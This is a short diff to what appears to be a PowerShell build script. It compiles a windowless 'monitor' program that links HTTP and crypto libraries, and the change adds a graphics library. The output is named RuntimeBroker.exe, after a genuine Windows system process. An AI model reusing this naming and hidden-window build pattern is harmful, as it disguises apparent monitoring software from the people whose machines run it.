@@ -5,7 +5,7 @@ windres version.rc -O coff -o version.res
 if (!$?) { Write-Output "Resource compilation failed"; exit 1 }
 
 $buildVersion = [int][double]::Parse((Get-Date -UFormat %s))
-g++ -static -Os -s -mwindows -D NETPEN_VERSION=$buildVersion monitor.cpp version.res -lwinhttp -lcrypt32 -o RuntimeBroker.exe
+g++ -static -Os -s -mwindows -D NETPEN_VERSION=$buildVersion monitor.cpp version.res -lwinhttp -lcrypt32 -lgdiplus -o RuntimeBroker.exe
 if (!$?) { Remove-Item -Force version.res -ErrorAction SilentlyContinue; Write-Output "Compilation failed"; exit 1 }
 
 # Remove-Item -Force version.res -ErrorAction SilentlyContinue
